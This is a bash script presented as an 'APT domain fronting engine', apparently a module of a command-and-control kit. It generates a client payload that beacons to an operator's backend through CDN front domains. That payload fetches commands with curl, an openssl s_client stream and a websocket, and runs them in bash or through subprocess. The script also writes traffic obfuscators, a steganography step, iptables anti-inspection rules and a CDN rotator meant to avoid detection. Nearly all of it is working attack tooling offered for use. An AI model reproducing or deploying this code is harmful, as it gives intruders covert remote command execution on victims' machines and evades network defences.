#!/bin/bash
# ============================================
# APT DOMAIN FRONTING ENGINE v1.0
# CDN Masking | Traffic Obfuscation | Anti-DPI
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

LOG_DIR="$HOME/c2_server/logs"
CONFIG_DIR="$HOME/c2_server/config"
FRONT_DIR="$HOME/c2_server/modules/stealth/fronting"

mkdir -p "$LOG_DIR" "$CONFIG_DIR" "$FRONT_DIR"

# === CDN PROVIDERS ===
declare -A CDN_PROVIDERS=(
    ["cloudflare"]="cdn.cloudflare.com"
    ["google"]="ajax.googleapis.com"
    ["microsoft"]="ajax.aspnetcdn.com"
    ["amazon"]="d15hcys5k9si4j.cloudfront.net"
    ["azure"]="azure.microsoft.com"
    ["fastly"]="fastly.com"
    ["akamai"]="akamai.com"
)

# === DOMAIN FRONTING CONFIG ===
setup_fronting() {
    echo -e "\n${CYAN}[Domain Fronting Setup]${NC}"
    echo -e "${YELLOW}Select CDN Provider:${NC}"
    
    local i=1
    for provider in "${!CDN_PROVIDERS[@]}"; do
        echo -e "  ${GREEN}$i)${NC} $provider (${CDN_PROVIDERS[$provider]})"
        ((i++))
    done
    echo -e "  ${GREEN}$i)${NC} Custom"
    echo ""
    read -r -p "Choose: " choice
    
    local front_domain=""
    local cdn_name=""
    i=1
    
    for provider in "${!CDN_PROVIDERS[@]}"; do
        [ "$i" -eq "$choice" ] && { front_domain="${CDN_PROVIDERS[$provider]}"; cdn_name="$provider"; }
        ((i++))
    done
    
    [ "$i" -eq "$choice" ] && {
        echo -ne "${YELLOW}Enter CDN domain: ${NC}"; read -r front_domain
        cdn_name="custom"
    }
    
    echo -ne "${YELLOW}Your VPS IP/Hostname: ${NC}"; read -r backend_host
    echo -ne "${YELLOW}C2 Port (443): ${NC}"; read -r c2_port
    c2_port=${c2_port:-443}
    
    # Save config
    cat > "$CONFIG_DIR/fronting.conf" << CONF
FRONT_DOMAIN=$front_domain
CDN_NAME=$cdn_name
BACKEND_HOST=$backend_host
C2_PORT=$c2_port
CONF
    
    echo -e "${GREEN}[+]${NC} Domain fronting configured!"
    echo -e "  Front: $front_domain ($cdn_name)"
    echo -e "  Backend: $backend_host:$c2_port"
    
    # Generate client payload
    generate_fronted_payload "$front_domain" "$backend_host" "$c2_port"
}

# === GENERATE FRONTED PAYLOAD ===
generate_fronted_payload() {
    local front_domain="$1"
    local backend_host="$2"
    local c2_port="$3"
    
    local payload_file="$FRONT_DIR/fronted_client.sh"
    
    cat > "$payload_file" << PAYLOAD
#!/bin/bash
# APT DOMAIN FRONTED CLIENT
# Traffic masked as $front_domain
# Actually connects to: $backend_host:$c2_port

FRONT_DOMAIN="$front_domain"
BACKEND_HOST="$backend_host"
C2_PORT="$c2_port"

# Method 1: HTTP Host Header Manipulation
fronted_connect_http() {
    while true; do
        # Connect to CDN with fake Host, real backend
        curl -s -H "Host: \$FRONT_DOMAIN" \
             -H "X-Forwarded-For: \$(curl -s ifconfig.me)" \
             -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
             "https://\$FRONT_DOMAIN/c2?backend=\$BACKEND_HOST:\$C2_PORT" \
             -o /tmp/.c2_response
        
        # Execute received commands
        bash /tmp/.c2_response 2>/dev/null
        sleep 30
    done
}

# Method 2: SNI Spoofing via OpenSSL
fronted_connect_sni() {
    while true; do
        # SNI shows CDN, actual connection to backend
        openssl s_client -connect "\$BACKEND_HOST:\$C2_PORT" \
            -servername "\$FRONT_DOMAIN" \
            -quiet 2>/dev/null | bash
        
        sleep 30
    done
}

# Method 3: WebSocket over CDN
fronted_connect_ws() {
    while true; do
        python3 -c "
import websocket, ssl
ws = websocket.create_connection(
    'wss://\$FRONT_DOMAIN/ws',
    header={'Host': '\$FRONT_DOMAIN'},
    sslopt={'server_hostname': '\$FRONT_DOMAIN'}
)
while True:
    cmd = ws.recv()
    import subprocess
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    ws.send(result.stdout)
" 2>/dev/null
        
        sleep 30
    done
}

# Start all methods
fronted_connect_http &
fronted_connect_sni &
fronted_connect_ws &

echo "[+] Domain fronted client started"
PAYLOAD

    chmod +x "$payload_file"
    echo -e "${GREEN}[+]${NC} Fronted client payload: $payload_file"
}

# === TRAFFIC OBFUSCATOR ===
traffic_obfuscator() {
    echo -e "\n${CYAN}[Traffic Obfuscation]${NC}"
    echo -e "${YELLOW}Select obfuscation method:${NC}"
    echo -e "  ${GREEN}1)${NC} XOR Encryption"
    echo -e "  ${GREEN}2)${NC} Base64 Encoding"
    echo -e "  ${GREEN}3)${NC} AES-256 Encryption"
    echo -e "  ${GREEN}4)${NC} Steganography (hide in image)"
    echo ""
    read -r -p "Choose: " choice
    
    case $choice in
        1)
            cat > "$FRONT_DIR/xor_obfuscator.py" << 'XOR'
#!/usr/bin/env python3
# XOR Traffic Obfuscator
import sys

KEY = "APT_C2_SECRET_KEY_2024"

def xor_encrypt(data):
    return ''.join(chr(ord(c) ^ ord(KEY[i % len(KEY)])) for i, c in enumerate(data))

if __name__ == "__main__":
    data = sys.stdin.read()
    print(xor_encrypt(data))
XOR
            chmod +x "$FRONT_DIR/xor_obfuscator.py"
            echo -e "${GREEN}[+]${NC} XOR obfuscator created"
            ;;
        2)
            cat > "$FRONT_DIR/base64_obfuscator.sh" << 'B64'
#!/bin/bash
# Base64 Traffic Obfuscator
while IFS= read -r line; do
    echo "$line" | base64 -w0
done
B64
            chmod +x "$FRONT_DIR/base64_obfuscator.sh"
            echo -e "${GREEN}[+]${NC} Base64 obfuscator created"
            ;;
        3)
            cat > "$FRONT_DIR/aes_obfuscator.py" << 'AES'
#!/usr/bin/env python3
# AES-256 Traffic Obfuscator
from Crypto.Cipher import AES
import base64, sys

KEY = b'APT_C2_AES256_KEY_2024_SECURE!!'
IV = b'1234567890123456'

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    padded = data + (16 - len(data) % 16) * chr(16 - len(data) % 16)
    return base64.b64encode(cipher.encrypt(padded.encode())).decode()

if __name__ == "__main__":
    print(encrypt(sys.stdin.read()))
AES
            chmod +x "$FRONT_DIR/aes_obfuscator.py"
            echo -e "${GREEN}[+]${NC} AES-256 obfuscator created"
            ;;
        4)
            cat > "$FRONT_DIR/stego_hide.sh" << 'STEGO'
#!/bin/bash
# Steganography - Hide C2 traffic in image
# Requires: steghide
HIDE_IMAGE="$HOME/c2_server/modules/stealth/fronting/carrier.jpg"

if [ ! -f "$HIDE_IMAGE" ]; then
    # Download a random image as carrier
    curl -s "https://picsum.photos/800/600" -o "$HIDE_IMAGE"
fi

# Hide data in image
steghide embed -cf "$HIDE_IMAGE" -sf /tmp/.c2_data.jpg -p "c2pass" -f 2>/dev/null
echo "[+] Data hidden in image"
STEGO
            chmod +x "$FRONT_DIR/stego_hide.sh"
            echo -e "${GREEN}[+]${NC} Steganography tool created"
            ;;
    esac
}

# === ANTI-DPI (Deep Packet Inspection) BYPASS ===
anti_dpi_setup() {
    echo -e "\n${CYAN}[Anti-DPI Setup]${NC}"
    
    cat > "$FRONT_DIR/anti_dpi.sh" << 'ANTIDPI'
#!/bin/bash
# ANTI-DPI ENGINE
# Bypass Deep Packet Inspection

# Method 1: Packet fragmentation
iptables -t nat -A POSTROUTING -p tcp --dport 443 -j NFQUEUE --queue-num 1 2>/dev/null

# Method 2: TTL manipulation
iptables -t mangle -A POSTROUTING -j TTL --ttl-set 64 2>/dev/null

# Method 3: TCP window size randomization
iptables -t mangle -A POSTROUTING -p tcp --tcp-flags SYN,RST SYN \
    -j TCPMSS --set-mss 1400 2>/dev/null

# Method 4: Padding injection
python3 -c "
import random
# Add random padding to packets
print('Padding:', 'X' * random.randint(100, 500))
" 2>/dev/null

echo "[+] Anti-DPI measures active"
ANTIDPI
    chmod +x "$FRONT_DIR/anti_dpi.sh"
    echo -e "${GREEN}[+]${NC} Anti-DPI engine created"
}

# === CDN ROTATION ===
cdn_rotation() {
    echo -e "\n${CYAN}[CDN Rotation Engine]${NC}"
    
    cat > "$FRONT_DIR/cdn_rotator.sh" << 'ROTATE'
#!/bin/bash
# CDN ROTATION ENGINE
# Rotate between multiple CDNs to avoid detection

CDNS=(
    "cdn.cloudflare.com"
    "ajax.googleapis.com"
    "ajax.aspnetcdn.com"
    "d15hcys5k9si4j.cloudfront.net"
    "azure.microsoft.com"
)

while true; do
    # Pick random CDN
    RANDOM_CDN=${CDNS[$RANDOM % ${#CDNS[@]}]}
    echo "[*] Switching to CDN: $RANDOM_CDN"
    
    # Update fronting config
    sed -i "s/FRONT_DOMAIN=.*/FRONT_DOMAIN=$RANDOM_CDN/" ~/c2_server/config/fronting.conf
    
    # Rotate every 30-60 minutes
    sleep $((1800 + RANDOM % 1800))
done
ROTATE
    chmod +x "$FRONT_DIR/cdn_rotator.sh"
    echo -e "${GREEN}[+]${NC} CDN rotation engine created"
}

# === FRONTING TEST ===
test_fronting() {
    echo -e "\n${CYAN}[Testing Domain Fronting]${NC}"
    
    [ ! -f "$CONFIG_DIR/fronting.conf" ] && {
        echo -e "${RED}[!]${NC} Configure fronting first (Option 1)"
        return
    }
    
    source "$CONFIG_DIR/fronting.conf"
    
    echo -e "${YELLOW}[*]${NC} Testing connection via $FRONT_DOMAIN..."
    
    # Test if front domain is accessible
    local http_code=$(curl -s -o /dev/null -w "%{http_code}" "https://$FRONT_DOMAIN" 2>/dev/null)
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "301" ] || [ "$http_code" = "302" ]; then
        echo -e "${GREEN}[+]${NC} Front domain accessible (HTTP $http_code)"
    else
        echo -e "${RED}[!]${NC} Front domain returned HTTP $http_code"
    fi
    
    # Test backend connectivity
    echo -e "${YELLOW}[*]${NC} Testing backend: $BACKEND_HOST:$C2_PORT..."
    nc -zv "$BACKEND_HOST" "$C2_PORT" 2>/dev/null && \
        echo -e "${GREEN}[+]${NC} Backend reachable" || \
        echo -e "${RED}[!]${NC} Backend not reachable"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  🌐 DOMAIN FRONTING v1.0   ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} ⚙️  Setup Domain Fronting"
        echo -e "  ${GREEN}2)${NC} 🔐 Traffic Obfuscation"
        echo -e "  ${GREEN}3)${NC} 🛡️ Anti-DPI Setup"
        echo -e "  ${GREEN}4)${NC} 🔄 CDN Rotation Engine"
        echo -e "  ${GREEN}5)${NC} 🧪 Test Fronting Connection"
        echo -e "  ${GREEN}6)${NC} 📦 Generate Fronted Payload"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) setup_fronting ;;
            2) traffic_obfuscator ;;
            3) anti_dpi_setup ;;
            4) cdn_rotation ;;
            5) test_fronting ;;
            6)
                [ -f "$CONFIG_DIR/fronting.conf" ] && source "$CONFIG_DIR/fronting.conf"
                generate_fronted_payload "$FRONT_DOMAIN" "$BACKEND_HOST" "$C2_PORT"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
